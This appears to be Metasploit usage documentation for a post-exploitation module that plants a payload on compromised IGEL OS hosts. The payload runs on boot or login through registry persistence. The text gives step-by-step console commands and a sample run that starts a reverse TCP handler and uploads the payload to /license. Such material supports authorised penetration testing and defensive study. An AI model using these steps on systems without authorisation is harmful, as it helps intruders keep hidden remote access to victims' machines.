## Vulnerable Application

IGEL OS with a `shell` or `meterpreter` session.

## Verification Steps

1. Get a `shell` or `meterpreter` session on an IGEL OS host
2. Use: `use exploit/linux/persistence/igel_persistence`
3. Set: `set SESSION <id>`, replacing `<id>` with the session ID
4. Set payload options, e.g. `LHOST`
5. Exploit: `run`
6. The payload is executed on next boot/login (dependent on `REGISTRY_KEY`)

## Options

| Name          | Description                                             |
| ------------- | ------------------------------------------------------- |
| REGISTRY_KEY  | Registry key to use for automatically executing payload |
| REGISTRY_ONLY | Set whether to store payload in registry                |
| TARGET_DIR    | Directory to write payload                              |

## Scenarios

```
msf exploit(linux/persistence/igel_persistence) > set SESSION 2
SESSION => 2
msf exploit(linux/persistence/igel_persistence) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf exploit(linux/persistence/igel_persistence) > run
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Uploading payload to /license
[*] Writing persistence to registry
[*] Exploit completed, but no session was created.
```
